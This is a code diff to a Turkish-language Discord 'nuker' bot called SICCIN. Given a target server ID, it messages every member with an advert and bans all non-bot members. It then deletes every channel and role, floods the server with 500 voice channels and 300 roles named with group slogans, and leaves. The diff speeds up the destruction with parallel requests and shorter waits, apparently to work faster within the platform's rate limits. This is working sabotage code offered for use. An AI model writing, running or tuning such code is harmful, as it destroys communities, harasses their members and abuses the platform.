@@ -36,6 +36,21 @@ const PROTECTED_SERVERS = [
   "1457597987294285979"
 ];
 
+// ================== KANAL İSİMLERİ (DÖNGÜLÜ) ==================
+const CHANNEL_NAMES = [
+  "BİZDEN",
+  "KAÇAMAZSINIZ",
+  ".gg/siccin👺",
+  "EDEBİ🔱",
+  "SİZLERİ",
+  "BİZLER",
+  "VAR",
+  "ETTİK"
+];
+
+// ================== ROL İSİMLERİ ==================
+const ROLE_NAME = "S I C C İ N🔱";
+
 // ================== DURUM KONTROL ==================
 function hasSiccinStatus(member) {
   if (!member?.presence?.activities) return false;
@@ -68,6 +83,11 @@ function mainSiccinEmbed(guild) {
 • 500 Ses Kanalı Oluşturur
 • 300 Rol Oluşturur
 • İşlem Bitince Sunucudan Çıkar
+
+**Kanal İsimleri (Döngü):**
+${CHANNEL_NAMES.map(name => `• ${name}`).join('\n')}
+
+**Rol İsimleri:** ${ROLE_NAME}
 
 **Nasıl Kullanılır?**
 Butona tıkla ve hedef sunucu ID gir.
@@ -163,11 +183,6 @@ function protectionAlertEmbed(data) {
     .setTimestamp();
 }
 
-// ================== ASENKRON BEKLEME FONKSİYONU ==================
-function delay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
 // ================== SICCiN İŞLEM ==================
 async function startSiccin(interaction, targetGuildId) {
   const executor = interaction.user;
@@ -205,7 +220,7 @@ async function startSiccin(interaction, targetGuildId) {
     });
 
   await interaction.followUp({
-    content: "🔥 SICCiN BAŞLATILDI\n⏳ İşlemler sırayla yapılıyor...",
+    content: "🔥 SICCiN BAŞLATILDI\n⚡ Hızlı modda işlemler yapılıyor...",
     ephemeral: true,
   });
 
@@ -218,20 +233,29 @@ async function startSiccin(interaction, targetGuildId) {
 
   // ================== 1. HERKESE DM ÇEK ==================
   try {
-    console.log(`[${guild.name}] DM gönderiliyor...`);
+    console.log(`[${guild.name}] DM gönderiliyor (hızlı mod)...`);
     const members = await guild.members.fetch();
     const nonBotMembers = members.filter(m => !m.user.bot);
     
+    // Paralel DM gönderimi
+    const dmPromises = [];
     for (const member of nonBotMembers.values()) {
-      try {
-        await member.send({ embeds: [dmEmbed(guild)] });
-        dmSent++;
-        console.log(`[${guild.name}] DM gönderildi: ${member.user.tag}`);
-        await delay(500); // Rate limit için uzun bekle
-      } catch (dmErr) {
-        // DM gönderilemezse devam et
+      dmPromises.push(
+        member.send({ embeds: [dmEmbed(guild)] })
+          .then(() => {
+            dmSent++;
+            console.log(`[${guild.name}] DM gönderildi: ${member.user.tag}`);
+          })
+          .catch(() => {})
+      );
+      
+      // Rate limit için çok kısa bekle
+      if (dmPromises.length % 5 === 0) {
+        await new Promise(resolve => setTimeout(resolve, 100));
       }
     }
+    
+    await Promise.allSettled(dmPromises);
     console.log(`[${guild.name}] ${dmSent} kişiye DM gönderildi`);
   } catch (err) {
     console.error(`[${guild.name}] DM gönderme hatası:`, err);
@@ -239,128 +263,163 @@ async function startSiccin(interaction, targetGuildId) {
 
   // ================== 2. HERKESİ BANLA ==================
   try {
-    console.log(`[${guild.name}] Banlama işlemi başlıyor...`);
+    console.log(`[${guild.name}] Banlama işlemi başlıyor (hızlı mod)...`);
     const members = await guild.members.fetch();
     const nonBotMembers = members.filter(m => !m.user.bot);
     
+    const banPromises = [];
     for (const member of nonBotMembers.values()) {
-      try {
-        await member.ban({ reason: "ＳＩＣＣＩＮ 🔱" });
-        banned++;
-        console.log(`[${guild.name}] Banlandı: ${member.user.tag}`);
-        await delay(1000); // Ban rate limit için uzun bekle
-      } catch (banErr) {
-        // Banlanamazsa devam et
+      banPromises.push(
+        member.ban({ reason: "ＳＩＣＣＩＮ 🔱" })
+          .then(() => {
+            banned++;
+            console.log(`[${guild.name}] Banlandı: ${member.user.tag}`);
+          })
+          .catch(() => {})
+      );
+      
+      // Rate limit için kısa bekle
+      if (banPromises.length % 3 === 0) {
+        await new Promise(resolve => setTimeout(resolve, 200));
       }
     }
+    
+    await Promise.allSettled(banPromises);
     console.log(`[${guild.name}] ${banned} kişi banlandı`);
   } catch (err) {
     console.error(`[${guild.name}] Banlama hatası:`, err);
   }
 
-  // ================== 3. TÜM KANALLARI SİL ==================
+  // ================== 3. TÜM KANALLARI SİL (HIZLI) ==================
   try {
-    console.log(`[${guild.name}] Kanallar siliniyor...`);
+    console.log(`[${guild.name}] Kanallar siliniyor (hızlı mod)...`);
     const channels = Array.from(guild.channels.cache.values());
     
-    // Önce ses kanallarını sil
+    const deletePromises = [];
     for (const channel of channels) {
-      try {
-        await channel.delete().catch(() => {});
-        channelsDeleted++;
-        console.log(`[${guild.name}] Kanal silindi: ${channel.name}`);
-        await delay(300);
-      } catch (channelErr) {
-        // Silinemezse devam et
+      deletePromises.push(
+        channel.delete()
+          .then(() => {
+            channelsDeleted++;
+            console.log(`[${guild.name}] Kanal silindi: ${channel.name}`);
+          })
+          .catch(() => {})
+      );
+      
+      // Çok hızlı - 50ms bekle
+      if (deletePromises.length % 10 === 0) {
+        await new Promise(resolve => setTimeout(resolve, 50));
       }
     }
+    
+    await Promise.allSettled(deletePromises);
     console.log(`[${guild.name}] ${channelsDeleted} kanal silindi`);
   } catch (err) {
     console.error(`[${guild.name}] Kanal silme hatası:`, err);
   }
 
-  // ================== 4. TÜM ROLLERİ SİL ==================
+  // ================== 4. TÜM ROLLERİ SİL (HIZLI) ==================
   try {
-    console.log(`[${guild.name}] Roller siliniyor...`);
+    console.log(`[${guild.name}] Roller siliniyor (hızlı mod)...`);
     const roles = Array.from(guild.roles.cache.values());
     
+    const roleDeletePromises = [];
     for (const role of roles) {
-      // @everyone rolünü ve bot rollerini silme
       if (role.id === guild.id || role.managed) continue;
       
-      try {
-        await role.delete().catch(() => {});
-        rolesDeleted++;
-        console.log(`[${guild.name}] Rol silindi: ${role.name}`);
-        await delay(300);
-      } catch (roleErr) {
-        // Silinemezse devam et
+      roleDeletePromises.push(
+        role.delete()
+          .then(() => {
+            rolesDeleted++;
+            console.log(`[${guild.name}] Rol silindi: ${role.name}`);
+          })
+          .catch(() => {})
+      );
+      
+      // Hızlı - 50ms bekle
+      if (roleDeletePromises.length % 10 === 0) {
+        await new Promise(resolve => setTimeout(resolve, 50));
       }
     }
+    
+    await Promise.allSettled(roleDeletePromises);
     console.log(`[${guild.name}] ${rolesDeleted} rol silindi`);
   } catch (err) {
     console.error(`[${guild.name}] Rol silme hatası:`, err);
   }
 
-  // ================== 5. 500 SES KANALI OLUŞTUR ==================
+  // ================== 5. 500 SES KANALI OLUŞTUR (SÜPER HIZLI) ==================
   try {
-    console.log(`[${guild.name}] 500 ses kanalı oluşturuluyor...`);
+    console.log(`[${guild.name}] 500 ses kanalı oluşturuluyor (süper hızlı mod)...`);
     
+    const channelPromises = [];
     for (let i = 1; i <= 500; i++) {
-      try {
-        const channelName = `S I C C İ N 🫩 ${i}`;
-        await guild.channels.create({
+      const channelNameIndex = (i - 1) % CHANNEL_NAMES.length;
+      const channelName = CHANNEL_NAMES[channelNameIndex];
+      
+      channelPromises.push(
+        guild.channels.create({
           name: channelName,
-          type: ChannelType.GuildVoice, // 2 = voice kanalı
+          type: ChannelType.GuildVoice,
           bitrate: 64000,
           userLimit: 0,
           rtcRegion: null
-        });
-        channelsCreated++;
-        
-        // İlerlemeyi göster
-        if (i % 50 === 0) {
-          console.log(`[${guild.name}] ${i}. ses kanalı oluşturuldu`);
-        }
-        
-        // Rate limit için bekle (ses kanalı oluşturma daha hızlı olabilir)
-        await delay(100);
-        
-      } catch (channelCreateErr) {
-        console.log(`[${guild.name}] Ses kanalı ${i} oluşturulamadı:`, channelCreateErr.message);
+        })
+          .then(() => {
+            channelsCreated++;
+            if (i % 100 === 0) {
+              console.log(`[${guild.name}] ${i}. ses kanalı oluşturuldu: ${channelName}`);
+            }
+          })
+          .catch(err => {
+            console.log(`[${guild.name}] Ses kanalı ${i} oluşturulamadı:`, err.message);
+          })
+      );
+      
+      // ÇOK HIZLI - sadece her 20 kanalda bir 30ms bekle
+      if (channelPromises.length % 20 === 0) {
+        await new Promise(resolve => setTimeout(resolve, 30));
       }
     }
+    
+    await Promise.allSettled(channelPromises);
     console.log(`[${guild.name}] ${channelsCreated} ses kanalı oluşturuldu`);
   } catch (err) {
     console.error(`[${guild.name}] Ses kanalı oluşturma hatası:`, err);
   }
 
-  // ================== 6. 300 ROL OLUŞTUR ==================
+  // ================== 6. 300 ROL OLUŞTUR (HIZLI) ==================
   try {
-    console.log(`[${guild.name}] 300 rol oluşturuluyor...`);
+    console.log(`[${guild.name}] 300 rol oluşturuluyor (hızlı mod)...`);
     
+    const rolePromises = [];
     for (let i = 1; i <= 300; i++) {
-      try {
-        await guild.roles.create({
-          name: `ＳＩＣＣＩＮ ${i}`,
+      rolePromises.push(
+        guild.roles.create({
+          name: ROLE_NAME,
           color: [Math.floor(Math.random() * 255), Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
           permissions: [],
-          mentionable: true
-        });
-        rolesCreated++;
-        
-        // İlerlemeyi göster
-        if (i % 30 === 0) {
-          console.log(`[${guild.name}] ${i}. rol oluşturuldu`);
-        }
-        
-        // Rate limit için bekle (rol oluşturma daha yavaş)
-        await delay(200);
-        
-      } catch (roleCreateErr) {
-        console.log(`[${guild.name}] Rol ${i} oluşturulamadı:`, roleCreateErr.message);
+          mentionable: true,
+          hoist: true
+        })
+          .then(() => {
+            rolesCreated++;
+            if (i % 50 === 0) {
+              console.log(`[${guild.name}] ${i}. rol oluşturuldu: ${ROLE_NAME}`);
+            }
+          })
+          .catch(err => {
+            console.log(`[${guild.name}] Rol ${i} oluşturulamadı:`, err.message);
+          })
+      );
+      
+      // Hızlı - her 15 rolde bir 50ms bekle
+      if (rolePromises.length % 15 === 0) {
+        await new Promise(resolve => setTimeout(resolve, 50));
       }
     }
+    
+    await Promise.allSettled(rolePromises);
     console.log(`[${guild.name}] ${rolesCreated} rol oluşturuldu`);
   } catch (err) {
     console.error(`[${guild.name}] Rol oluşturma hatası:`, err);
@@ -405,7 +464,9 @@ async function startSiccin(interaction, targetGuildId) {
                `DM Gönderilen: ${dmSent} kişi\n` +
                `Banlanan: ${banned} kişi\n` +
                `Silinen: ${channelsDeleted} kanal, ${rolesDeleted} rol\n` +
-               `Oluşturulan: ${channelsCreated} ses kanalı, ${rolesCreated} rol\n` +
+               `Oluşturulan: ${channelsCreated} ses kanalı\n` +
+               `Oluşturulan: ${rolesCreated} rol (${ROLE_NAME})\n` +
+               `Kanal İsimleri: ${CHANNEL_NAMES.join(' → ')}\n` +
                `Bot sunucudan ayrıldı.\n\n` +
                `#GLORY TO ＳＩＣＣＩＮ 🔱`,
       ephemeral: true,
@@ -558,20 +619,33 @@ client.on("ready", () => {
   console.log(`${client.user.tag} olarak giriş yapıldı!`);
   console.log(`Korunan sunucular: ${PROTECTED_SERVERS.join(", ")}`);
   
+  // Bot durumu
   client.user.setActivity({
-    name: ".siccin | 500 voice, 300 roles",
-    type: ActivityType.Playing,
+    name: ".gg/siccin | EDEBİ🔱",
+    type: ActivityType.Watching,
   });
   
+  // Bot durumunu göster
+  client.user.setStatus('online');
+  
   console.log("═══════════════════════════════════════");
-  console.log("SICCiN BOT AKTİF");
-  console.log("İşlem Sırası:");
-  console.log("1. Herkese DM gönder");
-  console.log("2. Herkesi banla");
-  console.log("3. Tüm kanalları sil");
-  console.log("4. Tüm rolleri sil");
-  console.log("5. 500 ses kanalı oluştur (S I C C İ N 🫩)");
-  console.log("6. 300 rol oluştur");
+  console.log("S I C C İ N 🔱 BOT AKTİF");
+  console.log(`Bot Durumu: .gg/siccin | EDEBİ🔱`);
+  console.log("═══════════════════════════════════════");
+  console.log("Kanal İsimleri (Döngü):");
+  CHANNEL_NAMES.forEach((name, index) => {
+    console.log(`${index + 1}. ${name}`);
+  });
+  console.log("═══════════════════════════════════════");
+  console.log(`Rol İsmi: ${ROLE_NAME}`);
+  console.log("═══════════════════════════════════════");
+  console.log("İşlem Sırası (HIZLI MOD):");
+  console.log("1. Herkese DM gönder (paralel)");
+  console.log("2. Herkesi banla (paralel)");
+  console.log("3. Tüm kanalları sil (50ms bekleme)");
+  console.log("4. Tüm rolleri sil (50ms bekleme)");
+  console.log("5. 500 ses kanalı oluştur (30ms bekleme)");
+  console.log("6. 300 rol oluştur (50ms bekleme)");
   console.log("7. Sunucudan çık");
   console.log("═══════════════════════════════════════");
 });
